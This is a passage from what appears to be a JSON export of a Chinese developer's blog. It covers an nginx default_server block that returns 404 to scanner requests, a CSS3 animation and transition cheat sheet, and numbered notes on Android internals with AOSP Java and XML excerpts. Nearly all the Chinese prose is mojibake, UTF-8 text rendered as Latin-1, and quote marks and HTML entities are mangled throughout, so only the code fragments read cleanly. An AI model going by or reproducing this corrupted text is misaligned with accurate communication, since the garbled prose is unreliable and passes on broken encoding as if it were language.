·117.111.27.194 - - [01/Nov/2017:02:43:06 -0400] â€œGET / HTTP/1.1â€ 301 178 â€œ-â€œ â€œ-â€œ ##server-nameå’Œuser-agentéƒ½æ²¡æœ‰ server { listen 80 default_server; server_name _; //è¿™ç§å¯ä»¥åŒ¹é…server-nameä¸ºç©ºçš„è¯·æ±‚ return 404; access_log off; } è¿˜å¯ä»¥æŠŠè¿™ç§ç½‘ç»œæ‰«æçš„ç¨‹åºå¯¼å…¥åˆ°å—é™çš„æœåŠ¡ä¸­ åœ¨ubuntu18.04ä¸Šï¼Œlogrotateä¼¼ä¹é»˜è®¤å·²ç»è¢«å®‰è£…è¿‡äº†ï¼Œæ‰€ä»¥ï¼Œæ¯å¤©/var/log/nginxé‡Œé¢çš„æ–‡ä»¶éƒ½ä¼šè¢«gzipä¸€é æœ‰æ—¶å€™ä¼šåœ¨error.logé‡Œé¢çœ‹åˆ°è¿™æ ·çš„è¯ï¼šaccept4() failed (24: Too many open files)cat /proc/sys/fs/file-max ##è¿™ä¸ªå€¼æ˜¯è·Ÿç³»ç»Ÿå†…å­˜ç›¸å…³çš„ å¤šæ ¸cpuå¯ä»¥è¯•ç€è°ƒæ•´worker_processeså’Œworker_cpu_affinityå‚æ•°æé«˜æ€§èƒ½ ç”¨failtobané™ä½è¢«æ”»å‡»æ¦‚ç‡ å‚è€ƒ nginx Configurations How To Install Nginx on Ubuntu 16.04 understanding-the-nginx-configuration-file if is evil, å¯ä»¥,ä½†ä¸è¦åœ¨configæ–‡ä»¶é‡Œé¢å†™if nginxçš„ä¸€äº›ä¼˜åŒ–ç­–ç•¥ rewrite rulesæ€ä¹ˆå†™ NGINX LOAD BALANCING â€“ HTTP LOAD BALANCER How to Use NGINX as a Reverse Proxyï¼Œä¸ä»…æ˜¯http(s)å±‚çš„ä»£ç†ï¼Œè¿˜æœ‰å…¶ä»–çš„protocolä¹Ÿæ”¯æŒ use-nginx-as-a-front-end-proxy-and-software-load-balancer","tags":[{"name":"tools","slug":"tools","permalink":"https://haldir65.github.io/tags/tools/"},{"name":"nginx","slug":"nginx","permalink":"https://haldir65.github.io/tags/nginx/"}]},{"title":"css3é€ŸæŸ¥æ‰‹å†Œ","date":"2017-12-09T17:56:06.000Z","path":"2017/12/09/2017-12-09-css3-explained/","text":"ä¸€ä»½css3çŸ¥è¯†æ±‡æ€» Animation.box{ background: white; width: 200px; height: 200px; position: relative; animation-name: mayanimation; animation-duration: 4s; animation-iteration-count: 1; animation-fill-mode: forwards; /* forwardsè¡¨ç¤ºåŠ¨ç”»å®Œæˆåï¼Œstay as the end of animation */ animation-delay: 2s; animation-direction: alternate; animation-timing-function: ease-out; } @keyframes myanimation { 0% {background-color: white;left:0px;top:0px;border-radius: 0 0 0 0 ;} 25%{background-color: red;left: 300px;top: 0px;border-radius: 50% 0 0 0 } 50%{background-color: green;left: 300px;top: 300px;border-radius: 50% 50% 0 0 } 75%{background-color: blue;left: 0px;top: 300px;border-radius: 50% 50% 50% 0} 100% {background-color: white;left: 0px;top: 0px;border-radius: 50% 50% 50% 50%} } éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œå¦‚æœanimationçš„durationä¸å†™çš„è¯ï¼Œæ˜¯ä¸ä¼šç”Ÿæ•ˆçš„ TransitionåŸºæœ¬å°±æ˜¯pseudo selectorä¹‹é—´ç›¸äº’å˜åŒ–çš„æ—¶å€™ï¼Œåœ¨æ–°çš„çŠ¶æ€å’ŒåŸæœ¬çš„çŠ¶æ€ä¹‹é—´å±æ€§å˜åŒ–åˆ‡æ¢çš„åŠ¨ç”»ã€‚Transitionè¿™ä¸ªè¯åº”è¯¥æ˜¯å¡é€šä¸­ä½¿ç”¨çš„ï¼Œç”¨äºæ˜¾ç¤ºfrom stateåˆ°to stateä¹‹é—´çš„è¿‡æ¸¡ã€‚ .box{ background: white; width: 300px; height: 300px; position: relative; margin: auto; top: 200px; text-align: center; vertical-align: middle; transition-property: all; transition-duration: 1s; transition-timing-function: linear; } .box:hover{ background: red; border-radius: 50%; transform: rotateY(180deg); } å’Œanimationä¸€æ ·ï¼Œå¦‚æœtransitionçš„durationä¸å†™çš„è¯ï¼Œæ˜¯ä¸ä¼šèµ·æ•ˆçš„ prefers-color-scheme: Hello darkness, my old friendprefers-color-schemeè¿™ä¸ªmedia css-flex-box-guide","tags":[{"name":"å‰ç«¯","slug":"å‰ç«¯","permalink":"https://haldir65.github.io/tags/å‰ç«¯/"}]},{"title":"AndroidçŸ¥è¯†é›†åˆ[ä¸‰]","date":"2017-12-08T22:33:26.000Z","path":"2017/12/08/2017-12-08-clutter-repo-for-android/","text":"ä¹‹å‰çš„æ–‡ç« å¿«è£…ä¸ä¸‹äº†ï¼Œæ‰€ä»¥å¦å¤–å¼€ä¸€ç¯‡æ–‡ç« ä¸“é—¨æ”¾Androidç›¸å…³çš„æ‚ä¹±çš„çŸ¥è¯†ç‚¹ã€‚ Android Source codeï¼Œèƒ½å¤Ÿå®æ—¶çœ‹åˆ°æäº¤ä¿¡æ¯androidxrefï¼Œä¸€ä¸ªæ¯”è¾ƒå¥½çš„æŸ¥çœ‹æºç çš„ç½‘ç«™From View to Pixelè®²äº†ViewRootImpl,SurfaceFlingerè¿™äº›ä¸œè¥¿ä¸€ä¸ªå¾ˆé•¿çš„å…³äºæ˜¾ç¤ºåŸç†çš„æ–‡ç« ï¼ŒåŸºæœ¬ä¸Šä»€ä¹ˆéƒ½è®²äº† 1.åŸºæœ¬ä¸Šæ‰€æœ‰çš„Android System Eventéƒ½æ˜¯ä»ActivityThreadä¸­å‘èµ·çš„onDetachedFromWindowæ˜¯ä»ActivityThreadçš„handleDestoryActivityä¼ ä¸‹æ¥çš„ï¼Œèµ°åˆ°windowManager.removeViewImediate,ç„¶åViewRootImpl.doDie,ç„¶åViewRootImpl.dispatchDetachedFromWindowï¼Œç„¶åDecoreView.dispatchDetachedFromWindowï¼Œç„¶åä¸€ä¸ªä¸ªchildä¼ ä¸‹å»ã€‚æ‰€æœ‰çš„Viewèµ°å®Œäº†ä¹‹åï¼ŒDecorViewåœ¨onDetachedFromWindowä¸­ä»¥Window.Callbackçš„æ–¹å¼é¡ºæ‰‹é€šçŸ¥äº†Activityçš„onDetachedFromWindowã€‚å…¶å®æ‰“ä¸ªæ–­ç‚¹çœ‹çš„è¯å°±å¿«ä¸€ç‚¹ã€‚ 2. onSaveInstanceå¯¹äºæœ‰idçš„Viewï¼Œç³»ç»Ÿä¼šè‡ªåŠ¨å¸®å¿™å­˜ä¸€ç‚¹ä¸œè¥¿å½“ç„¶onSaveInstanceä¹Ÿæ˜¯ä»ActivityThreadé‡Œé¢ä¼ é€’ä¸‹æ¥çš„ã€‚è¿˜æœ‰å°±æ˜¯onCreate(Bundle)å’ŒonRestroreSaveInstanceState(Bundle)é‡Œé¢çš„bundleæ˜¯åŒä¸€ä¸ªobjectã€‚romain Guyè¯´æœ€åˆonSaveInstanceå’ŒonRestroreSaveInstanceStateæœ¬æ¥å«onIcy(å†»ç»“)å’ŒonThawï¼ˆè§£å†»ï¼‰ï¼Œç¡®å®å¾ˆå½¢è±¡ã€‚å…¶å®è¿™ä¸ªåˆ°ç°åœ¨è¿˜æœ‰ä¸€äº›ç—•è¿¹:ViewGroup.java protected void dispatchFreezeSelfOnly(SparseArray&lt;Parcelable&gt; container) { super.dispatchSaveInstanceState(container); } protected void dispatchThawSelfOnly(SparseArray&lt;Parcelable&gt; container) { super.dispatchRestoreInstanceState(container); } 3.android asset atlaså°±æ˜¯ä¸ºäº†èŠ‚çœassetè€—è´¹çš„å†…å­˜ï¼Œå°†ä¸€äº›ç³»ç»Ÿå…¬ç”¨çš„èµ„æºä½œä¸ºä¸€ä¸ªæœåŠ¡å…ˆè·‘èµ·æ¥ï¼Œæ‰€æœ‰appçš„processå…±ç”¨è¿™éƒ¨åˆ†èµ„æºã€‚ 4. ZygoteInitè¿™ç¯‡æ–‡ç« è®²åˆ°äº†ä»Launcherç‚¹å‡»iconåˆ°èµ·ä¸€ä¸ªappçš„è¿‡ç¨‹ï¼ŒLauncheræ‰€åœ¨è¿›ç¨‹é€šè¿‡IPCèµ°startActivityè¯·æ±‚ä½äºsystem_serverè¿›ç¨‹çš„ActivityManagerService,åè€…é€šè¿‡socket(Zygoteè¿›ç¨‹è·‘èµ·æ¥ä¹‹åå°±ä¸€ç›´åœ¨å¾ªç¯ç­‰å¾…è¯·æ±‚)è¯·æ±‚Zygote forkå‡ºä¸€ä¸ªappçš„è¿›ç¨‹ï¼Œæ¥ç€é€šçŸ¥system_serverå»èµ°Binder IPCå»scheduleStartActivity(åé¢å°±éƒ½æ˜¯Appæ‰€åœ¨è¿›ç¨‹äº†)ã€‚ 5. Michael Baileyæ¯å¹´çš„æ¼”è®²éƒ½å¾ˆç²¾å½©Droidcon NYC 2015 - How the Main Thread worksDroidcon NYC 2016 - How LayoutInflater worksdroidcon NYC 2017 - How Espresso Works 2016å¹´çš„æ¼”è®²ä¸­æåˆ°äº†LayoutInflaterä¸­çš„å¥½ç©çš„æ³¨é‡ŠLayoutInflater.java if (name.equals(TAG_1995)) { // Let&#39;s party like it&#39;s 1995! return new BlinkLayout(context, attrs); } 6. Chris Banesåœ¨2017å¹´ç»™å‡ºäº†å…³äºçŠ¶æ€æ çš„è§£é‡Šdroidcon NYC 2017 - Becoming a master window fitter 7. Androidé»˜è®¤çš„launcherçš„repoåœ¨Launcher3,åº”è¯¥æ˜¯å±äºSystem UI Teamåœ¨ç»´æŠ¤ã€‚todo é‚£ä¸ªç‚¹å‡»äº†iconè¿›åº”ç”¨çš„ç‚¹å‡»äº‹ä»¶åœ¨å“ªé‡Œã€‚å¤§è‡´æ˜¯åœ¨Launcher.javaè¿™ä¸ªæ–‡ä»¶çš„startActivitySafelyé‡Œé¢ 8. åœ¨string.xmlé‡Œé¢æ”¾ä¸€äº›formatçš„å­—ç¬¦public static void main(String[] args) { String s1 = &quot;è¿™é‡Œé¢å¯ä»¥æ”¾å¤šä¸ªå­—ç¬¦ä¸²%1$s,%2$så‰é¢åŠ ä¸Šä¸€ä¸ªç™¾åˆ†å·å’Œæ•°å­—ï¼Œä»£è¡¨é¡ºåº&quot;; String s2 = &quot;ç™¾åˆ†å·çš„då’Œç™¾åˆ†å·çš„så¯ä»¥æ··ç€%1$sç”¨çš„ï¼Œæ¯”å¦‚è¿™ä¸ª%2$dæ•°å­—ä»€ä¹ˆçš„ï¼Œç¬¬ä¸‰ä¸ªæ˜¯å¸¦ç™¾åˆ†å·çš„æ•°å­—%3$d%%è¿™ä¸ªç”±äºéœ€è¦æ˜¾ç¤ºç™¾åˆ†å·ï¼Œæ‰€ä»¥åŠ ä¸Šä¸¤ä¸ªç™¾åˆ†å·&quot;; System.out.println(String.format(s1,&quot;XXXX&quot;,&quot;XXX&quot;)); System.out.println(String.format(s2,&quot;XXX&quot;, 100, 100)); } å®é™…è¾“å‡º è¿™é‡Œé¢å¯ä»¥æ”¾å¤šä¸ªå­—ç¬¦ä¸²XXXX,XXXå‰é¢åŠ ä¸Šä¸€ä¸ªç™¾åˆ†å·å’Œæ•°å­—ï¼Œä»£è¡¨é¡ºåºç™¾åˆ†å·çš„då’Œç™¾åˆ†å·çš„så¯ä»¥æ··ç€XXXç”¨çš„ï¼Œæ¯”å¦‚è¿™ä¸ª100æ•°å­—ä»€ä¹ˆçš„ï¼Œç¬¬ä¸‰ä¸ªæ˜¯å¸¦ç™¾åˆ†å·çš„æ•°å­—100%è¿™ä¸ªç”±äºéœ€è¦æ˜¾ç¤ºç™¾åˆ†å·ï¼Œæ‰€ä»¥åŠ ä¸Šä¸¤ä¸ªç™¾åˆ†å· %d represents an integer; you want to use %f for a double. æ®çŒœæµ‹dä»£è¡¨decimalè€Œä¸æ˜¯double 9.æˆ‘è®°å¾—Chet Haaseè¯´è¿‡LollipopåŠä»¥ä¸Šçš„Buttoné»˜è®¤æ˜¯æœ‰ä¸€ä¸ªelevationçš„è®°å¾—Chetåœ¨ä¸€æ¬¡æ¼”è®²ä¸­è¯´åˆ°Appcompatåœ¨5.0ä»¥ä¸Šé»˜è®¤ä½¿ç”¨material Theme, Buttonçš„é»˜è®¤elevationå¥½åƒæ˜¯3dpã€‚æ—¥å¸¸å¼€å‘ä¸­ä¹Ÿç»å¸¸ä¼šçœ‹è§buttonå’Œè®¾ç½®elevation=0çš„buttonç›¸æ¯”ç¡®å®æœ‰äº›é˜´å½±ã€‚åœ¨Buttonçš„æ„é€ å‡½æ•°é‡Œé¢æ‰“äº†æ–­ç‚¹ï¼Œåœ¨setElevationä¹Ÿæ‰“äº†æ–­ç‚¹ï¼Œæœ€åå‘ç°æ˜¯åœ¨Viewåˆ›å»ºä¹‹åChoregrapheråœ¨doFrameçš„æ—¶å€™runäº†ä¸€ä¸ªAnimationï¼Œåœ¨è¿™ä¸ªanimationä¸­è®¾ç½®äº†ä¸€ä¸ª6pxçš„elevation(2dpï¼ŒåŸæ¥Chetè®°é”™äº†)ã€‚è‡³äºè¿™ä¸ª2dpæ˜¯é‚£æ¥çš„å‘¢ï¼š &lt;Button ... android:stateListAnimator=&quot;@null&quot; /&gt; &lt;Button ... android:stateListAnimator=&quot;@anim/my_animator&quot; /&gt; æœ€ç»ˆåœ¨ç½‘ä¸Šæ‰¾åˆ°äº†core/res/res/anim/button_state_list_anim_material.xml &lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt; &lt;selector xmlns:android=&quot;http://schemas.android.com/apk/res/android&quot;&gt; &lt;item android:state_pressed=&quot;true&quot; android:state_enabled=&quot;true&quot;&gt; &lt;set&gt; &lt;objectAnimator android:propertyName=&quot;translationZ&quot; android:duration=&quot;@integer/button_pressed_animation_duration&quot; 100ms android:valueTo=&quot;@dimen/button_pressed_z_material&quot; ## 4dp å…¶å®ç¨å¾®æ³¨æ„ä¸‹ï¼Œæ‰‹æŒ‡æŒ‰ä½ä¸€ä¸ªButtonçš„æ—¶å€™ï¼ŒButtonåº•éƒ¨çš„é˜´å½±ä¼šæ‰©å¤§ï¼Œå°±æ˜¯è¿™ä¸ª4dpçš„å±æ€§åŠ¨ç”»åœ¨è·‘ android:valueType=&quot;floatType&quot;/&gt; &lt;objectAnimator android:propertyName=&quot;elevation&quot; android:duration=&quot;0&quot; android:valueTo=&quot;@dimen/button_elevation_material&quot; ## 2dp android:valueType=&quot;floatType&quot;/&gt; &lt;/set&gt; &lt;/item&gt; &lt;!-- base state --&gt; &lt;item android:state_enabled=&quot;true&quot;&gt; &lt;set&gt; &lt;objectAnimator android:propertyName=&quot;translationZ&quot; android:duration=&quot;@integer/button_pressed_animation_duration&quot; ##100ms android:valueTo=&quot;0&quot; android:startDelay=&quot;@integer/button_pressed_animation_delay&quot; ## 100ms android:valueType=&quot;floatType&quot;/&gt; &lt;objectAnimator android:propertyName=&quot;elevation&quot; android:duration=&quot;0&quot; android:valueTo=&quot;@dimen/button_elevation_material&quot; ## 2dp android:valueType=&quot;floatType&quot; /&gt; &lt;/set&gt; &lt;/item&gt; &lt;item&gt; &lt;set&gt; &lt;objectAnimator android:propertyName=&quot;translationZ&quot; android:duration=&quot;0&quot; android:valueTo=&quot;0&quot; android:valueType=&quot;floatType&quot;/&gt; &lt;objectAnimator android:propertyName=&quot;elevation&quot; android:duration=&quot;0&quot; android:valueTo=&quot;0&quot; android:valueType=&quot;floatType&quot;/&gt; &lt;/set&gt; &lt;/item&gt; &lt;/selector&gt; æ³¨æ„é‚£ä¸ªbutton_elevation_materialï¼šåœ¨aospä¸­ &lt;!-- Elevation when button is pressed --&gt; &lt;dimen name=&quot;button_elevation_material&quot;&gt;2dp&lt;/dimen&gt; &lt;!-- Z translation to apply when button is pressed --&gt; &lt;dimen name=&quot;button_pressed_z_material&quot;&gt;4dp&lt;/dimen&gt; æ‰€ä»¥Lollipopä¸Šä½¿ç”¨Appcompatä¸»é¢˜ï¼Œä»€ä¹ˆéƒ½ä¸æ”¹ï¼Œbuttoné»˜è®¤æ˜¯ä¼šæœ‰2dpçš„elevationçš„è‡³äºè¿™ä¸ªelevationä¸ºä»€ä¹ˆä¸æ˜¯åœ¨åˆå§‹åŒ–çš„æ—¶å€™å°±è®¾ç½®çš„ï¼ˆæ‰“æ–­ç‚¹çš„æ—¶å€™èµ°å®Œæ„é€ å‡½æ•°,getElevationè¿˜æ˜¯0ï¼‰ï¼Œå°±åœ¨äºè¿™ä¸Šé¢è¿™ä¸ªAnimationDelay(å…¶å®æ˜¯100msä¹‹åå†å»è¿è¡Œè¿™ä¸ªåŠ¨ç”»)ï¼Œä»å †æ ˆæ¥çœ‹ï¼Œæœ€ç»ˆå¯¼è‡´è°ƒç”¨setElevationçš„åœ°æ–¹æ˜¯åœ¨drawableStateChangeè¿™ä¸ªæ–¹æ³•é‡Œé¢ã€‚ 10. å†…ç½‘ä¼ è¾“åŠŸèƒ½çš„åŸç†æœ‰äº›Appæä¾›å±€åŸŸç½‘å†…æ— é™ä¼ è¾“æ–‡ä»¶çš„èƒ½åŠ›ï¼šæœ¬è´¨ä¸Šæ˜¯ç”¨äº†TCPæˆ–è€…UDPã€‚åœ¨javaå±‚çš„è¯ï¼ŒTCPç”¨çš„æ˜¯java.net.Socketï¼ŒUDPç”¨çš„æ˜¯java.net.DatagramSocketã€‚ç”±äºæ•°æ®ä¼ è¾“æ˜¯åŒå‘çš„ï¼Œå®¢æˆ·ç«¯å’ŒServerç«¯éƒ½éœ€è¦åˆ›å»ºè¿™æ ·çš„Object Instanceã€‚ä¸€ä¸ªæ¯”è¾ƒå¥½çš„DemoUnixçš„è¾“å…¥è¾“å‡º(IO)ç³»ç»Ÿéµå¾ªOpen-Read-Write-Closeè¿™æ ·çš„æ“ä½œèŒƒæœ¬ã€‚ 11.v7åŒ…é‡Œé¢çš„Toolbaråªæ˜¯ä¸€ä¸ªè‡ªå®šä¹‰Viewéšä¾¿ä¸¾ä¸€ä¸ªä¾‹å­ï¼Œå³ä¸Šè§’çš„optionMenuç‚¹å‡»è·³å‡ºçš„å¼¹çª—é‡Œé¢å…¶å®æ˜¯ä¸€ä¸ªListViewï¼Œå…·ä½“çš„classæ˜¯android.support.v7.view.menu.ListMenuItemViewã€‚éƒ½æ˜¯å¾ˆå¸¸è§„çš„è‡ªå®šä¹‰Viewçš„åšæ³•ï¼Œè¿™ä¸ªListViewçš„Adapterå«åšMenuAdapterï¼Œè¿™ä¸ªAdapterçš„itemLayoutå¸ƒå±€æ–‡ä»¶å«åšabc_popup_menu_item_layout.xmlabc_popup_menu_item_layout.xml &lt;android.support.v7.internal.view.menu.ListMenuItemView xmlns:android=&quot;http://schemas.android.com/apk/res/android&quot; android:layout_width=&quot;fill_parent&quot; android:layout_height=&quot;?attr/dropdownListPreferredItemHeight&quot; android:minWidth=&quot;196dip&quot; android:paddingRight=&quot;16dip&quot;&gt; &lt;!-- Icon will be inserted here. --&gt; &lt;!-- The title and summary have some gap between them, and this &#39;group&#39; should be centered vertically. --&gt; &lt;RelativeLayout android:layout_width=&quot;0dip&quot; android:layout_weight=&quot;1&quot; android:layout_height=&quot;wrap_content&quot; android:layout_gravity=&quot;center_vertical&quot; android:layout_marginLeft=&quot;16dip&quot; android:duplicateParentState=&quot;true&quot;&gt; &lt;TextView android:id=&quot;@+id/title&quot; android:layout_width=&quot;fill_parent&quot; android:layout_height=&quot;wrap_content&quot; android:layout_alignParentTop=&quot;true&quot; android:layout_alignParentLeft=&quot;true&quot; android:textAppearance=&quot;?attr/textAppearanceLargePopupMenu&quot; android:singleLine=&quot;true&quot; android:duplicateParentState=&quot;true&quot; android:ellipsize=&quot;marquee&quot; android:fadingEdge=&quot;horizontal&quot;/&gt; &lt;TextView android:id=&quot;@+id/shortcut&quot; android:layout_width=&quot;wrap_content&quot; android:layout_height=&quot;wrap_content&quot; android:layout_below=&quot;@id/title&quot; android:layout_alignParentLeft=&quot;true&quot; android:textAppearance=&quot;?attr/textAppearanceSmallPopupMenu&quot; android:singleLine=&quot;true&quot; android:duplicateParentState=&quot;true&quot;/&gt; &lt;/RelativeLayout&gt; &lt;!-- Checkbox, and/or radio button will be inserted here. --&gt; &lt;/android.support.v7.internal.view.menu.ListMenuItemView&gt; ä¸€èˆ¬æ¥è®²ï¼ŒMenuItemçš„å­—ä½“å¤§å°ï¼Œé¢œè‰²éƒ½æ˜¯éœ€è¦åœ¨themeä¸­å†™çš„ã€‚æ‰€ä»¥ç…§è¯´ç¡¬è¦ç”¨findViewById(ViewGroupçš„findViewTraversal)å…¶å®æ˜¯èƒ½æ‰¾åˆ°çš„ã€‚ 12. Message.ontainä»¥åŠç›¸ä¼¼çš„åœºæ™¯MotionEvent.ontain()ï¼ŒTouchTarget.ontain(),HoverTarget.ontain()â€¦.MotionEventæœ€å¤šç¼“å­˜10ä¸ªï¼ŒTouchTargetå’ŒHoverTargetè¿™äº›éƒ½æ˜¯åœ¨çœ‹ViewGroupæºç çš„æ—¶å€™ç…åˆ°çš„ï¼Œç®€å•ç‚¹ã€‚ç¨å¾®çœ‹ä¸‹å°±çŸ¥é“è¿™ç§obtain,recycleå†™æ³•çš„å¥—è·¯ã€‚ private static final class TouchTarget { private static final int MAX_RECYCLED = 32; private static final Object sRecycleLock = new Object[0]; private static TouchTarget sRecycleBin; private static int sRecycledCount; public static final int ALL_POINTER_IDS = -1; // all ones // The touched child view. public View child; // The combined bit mask of pointer ids for all pointers captured by the target. public int pointerIdBits; // The next target in the target list. public TouchTarget next; private TouchTarget() { } public static TouchTarget obtain(@NonNull View child, int pointerIdBits) { if (child == null) { throw new IllegalArgumentException(&quot;child must be non-null&quot;); } final TouchTarget target; synchronized (sRecycleLock) { if (sRecycleBin == null) { target = new TouchTarget(); } else { target = sRecycleBin; sRecycleBin = target.next; sRecycledCount--; target.next = null; } } target.child = child; target.pointerIdBits = pointerIdBits; return target; } public void recycle() { if (child == null) { throw new IllegalStateException(&quot;already recycled once&quot;); } synchronized (sRecycleLock) { if (sRecycledCount &lt; MAX_RECYCLED) { next = sRecycleBin; sRecycleBin = this; sRecycledCount += 1; } else { next = null; } child = null; } } } 13. ä»ç‚¹å‡»Launcheråˆ°åº”ç”¨å¯åŠ¨çš„è¿‡ç¨‹ å€ŸåŠ©binderé©±åŠ¨ActivityManagerService.startActivity-&gt; (AMS)â€¦//ä¸€ç³»ç±»AMSçš„è°ƒç”¨é“¾å’Œä¸€äº›ä¸Launcheré€šè¿‡Binderçš„äº’ç›¸è°ƒç”¨è¿‡ç¨‹ï¼Œæ­¤æ—¶ä»ç„¶æœªåˆ›å»ºåº”ç”¨ç¨‹åºçš„è¿›ç¨‹ã€‚â€¦ AMSåˆ›å»ºä¸€ä¸ªæ–°çš„è¿›ç¨‹ï¼Œç”¨æ¥å¯åŠ¨ä¸€ä¸ªActivityThreadå®ä¾‹ï¼Œ å³å°†è¦å¯åŠ¨çš„Activityå°±æ˜¯åœ¨è¿™ä¸ªActivityThreadå®ä¾‹ä¸­è¿è¡ŒProcess.start(â€œandroid.app.ActivityThreadâ€,â€¦)-&gt;// é€šè¿‡zygoteæœºåˆ¶åˆ›å»ºä¸€ä¸ªæ–°çš„è¿›ç¨‹Process.startViaZygote-&gt;è°ƒç”¨æ–°è¿›ç¨‹çš„main()ActivityThread.main-&gt; Android åº”ç”¨ç‚¹å‡»å›¾æ ‡åˆ°Activityç•Œé¢æ˜¾ç¤ºçš„è¿‡ç¨‹åˆ†æ 14. Contextæ˜¯ä»€ä¹ˆActivityThread.java createBaseContextForActivity{ ContextImpl appContext = ContextImpl.createActivityContext( this, r.packageInfo, r.activityInfo, r.token, displayId, r.overrideConfig); } ContextImplåŒ…å«èµ„æºä¿¡æ¯ã€å¯¹Contextçš„ä¸€äº›å‡½æ•°çš„å®ç°ç­‰ã€‚æ¯æ¬¡åˆ›å»ºActivityéƒ½ä¼šæ–°å»ºä¸€ä¸ªContextImpl 15. Dex file explainedThe Dex File Format 16 .PackageParserå’ŒAndroid.manifestæ–‡ä»¶æœ‰å…³Android APKåº”ç”¨å®‰è£…åŸç†(1)-è§£æAndroidManifeståŸç†-. 17. åœ¨Dialogä¸­getContextè·å–çš„æ˜¯ContextThemeWrapperContextThemeWrapperæ˜¯API 1å°±æœ‰äº†çš„ï¼Œä¸»è¦æ˜¯åŒ…è£…ä¸€ä¸‹contextï¼Œå°†Contextçš„å¤–éƒ¨è°ƒç”¨æ·»åŠ ä¸€äº›åŒ…è£…ã€‚ 18. ä½ç‰ˆæœ¬çš„xmlå±æ€§æ€ä¹ˆå†™mylayout.xml &lt;Button android:layout_width=&quot;wrap_content&quot; android:layout_height=&quot;wrap_content&quot; android:elevation=&quot;10dp&quot; /&gt; è¿™æ ·å†™çš„è¯ï¼ŒLintè‚¯å®šä¼šæŠ¥warningã€‚è§£å†³åŠæ³•ï¼Œalt+enterï¼ŒAndroid studioè‡ªåŠ¨ç”Ÿæˆä¸€ä¸ª/layout-v21/maylayout.xmlã€‚ç°åœ¨æƒ³èµ·æ¥å¾ˆå¤šé¡¹ç›®é‡Œv-xxæ–‡ä»¶å¤¹ï¼Œå…¶å®æ˜¯è¿™ä¸ªæ„æ€ã€‚è¿˜æœ‰ä¸€ç§å†™æ³• style=â€?android:attr/borderlessButtonStyleâ€è‡ªå·±å†™styleä¹Ÿæ˜¯è¡Œçš„ 19. LocalBroadCastManagerå¥½åƒç¡®å®æ˜¯åŸºäºhandlerå®ç°çš„Appå†…éƒ¨å…¨å±€æ‹¥æœ‰ä¸€ä¸ªLocalBroadCastManagerå®ä¾‹ï¼Œå†…éƒ¨æŒæœ‰ä¸€ä¸ªhandlerï¼Œå¯¹å¤–æš´éœ²åŠŸèƒ½sendBroadcastã€‚å°±æ˜¯å¾€handleré‡Œä¸¢ä¸€ä¸ªmessage MSG_EXEC_PENDING_BROADCASTSï¼Œå¤„ç†è¿™ä¸ªmessageå°±æ˜¯executePendingBroadcastsã€‚æ‰€ä»¥é»˜è®¤æ˜¯åœ¨ä¸‹ä¸€ä¸ªmessageä¸­å¤„ç†çš„ã€‚å¦‚æœæƒ³åœ¨å½“å‰messageä¸­å°±å¤„ç†æ‰ï¼Œè¿˜æœ‰ä¸€ä¸ªsendBroadcastSyncæ–¹æ³•ï¼Œä½†è¿™ä¼šæŠŠå½“å‰æŒæœ‰çš„æ‰€æœ‰å¾…å¤„ç†æ¶ˆæ¯å…¨éƒ¨flushæ‰ã€‚sendBroadcastï¼ŒunregisterReceiverï¼ŒregisterReceiverå†…éƒ¨ç”¨äº†synchronizeï¼Œæ‰€ä»¥æ˜¯çº¿ç¨‹å®‰å…¨çš„ã€‚stackoverflowä¸Šä¹Ÿæœ‰äººæŒ‡å‡ºLocalBrodcatManagerä¸æ”¯æŒipc.BroadcastReceiverå€’æ˜¯å¯ä»¥çš„ï¼ŒContentProviderä¹Ÿæ˜¯å®˜æ–¹æ”¯æŒipcçš„ç»„ä»¶ 20. ViewPagerä¸ºä»€ä¹ˆæ²¡æœ‰é‚£äº›attrsçš„å¯ä»¥å†™åœ¨xmlé‡Œé¢çš„å±æ€§ Adam Powellåœ¨15å¹´çš„Android Dev summitä¸Šè¯´è¿‡ï¼šthis is pre aar gradle age, if we were to do it today , we definitely would addã€‚ çœ‹äº†ä¸‹aospçš„gitæ—¥å¿—ï¼ŒViewPageræ˜¯2011å¹´å°±æœ‰äº†çš„ã€‚è€Œaaræ˜¯éšç€android studioçš„å‘å¸ƒæ¨å‡ºçš„ã€‚ jarå’Œaarçš„åŒºåˆ«: jar : JAR æ–‡ä»¶å°±æ˜¯ Java Archive Fileï¼Œé¡¾åæ€æ„ï¼Œå®ƒçš„åº”ç”¨æ˜¯ä¸ Java æ¯æ¯ç›¸å…³çš„ï¼Œæ˜¯ Java çš„ä¸€ç§æ–‡æ¡£æ ¼å¼ã€‚åªåŒ…å«äº†classæ–‡ä»¶ä¸æ¸…å•æ–‡ä»¶ ï¼Œä¸åŒ…å«èµ„æºæ–‡ä»¶ï¼Œå¦‚å›¾ç‰‡ç­‰æ‰€æœ‰resä¸­çš„æ–‡ä»¶ã€‚ aar: aarï¼ŒAARï¼ˆAndroid Archiveï¼‰åŒ…æ˜¯ä¸€ä¸ªAndroidåº“é¡¹ç›®çš„äºŒè¿›åˆ¶å½’æ¡£æ–‡ä»¶,åŒ…å«ä¸€äº›è‡ªå·±å†™çš„æ§ä»¶å¸ƒå±€æ–‡ä»¶ä»¥åŠå­—ä½“ç­‰èµ„æºæ–‡ä»¶(resourcesæˆ–è€…manifestæ–‡ä»¶)é‚£ä¹ˆå°±åªèƒ½ä½¿ç”¨*.aaræ–‡ä»¶ã€‚ 21. éƒ½çŸ¥é“RelativeLayoutä¼šmeasureä¸¤æ¬¡childï¼ŒLinearLayoutåœ¨åŠ weightçš„æ—¶å€™ä¹Ÿä¼šmeasureä¸¤æ¬¡LinearLayout.javameasureVertical() // We have no limit, so make all weighted views as tall as the largest child. // Children will have already been measured once. if (useLargestChild &amp;&amp; heightMode != MeasureSpec.EXACTLY) { for (int i = 0; i &lt; count; i++) { final View child = getVirtualChildAt(i); // ...... } } 22. gradle wrapperæ–‡ä»¶çš„ä½œç”¨understanding-the-gradle-wrapperè¿›ä¸€ä¸ªæ–°ç›®å½• gradle wrapper å‘½ä»¤ä¼šç”Ÿæˆå¦‚ä¸‹ç›®å½•â”œâ”€.gradleâ”‚ â”œâ”€4.4.1â”‚ â”‚ â”œâ”€fileChangesâ”‚ â”‚ â”œâ”€fileHashesâ”‚ â”‚ â””â”€taskHistoryâ”‚ â””â”€buildOutputCleanupâ””â”€gradle 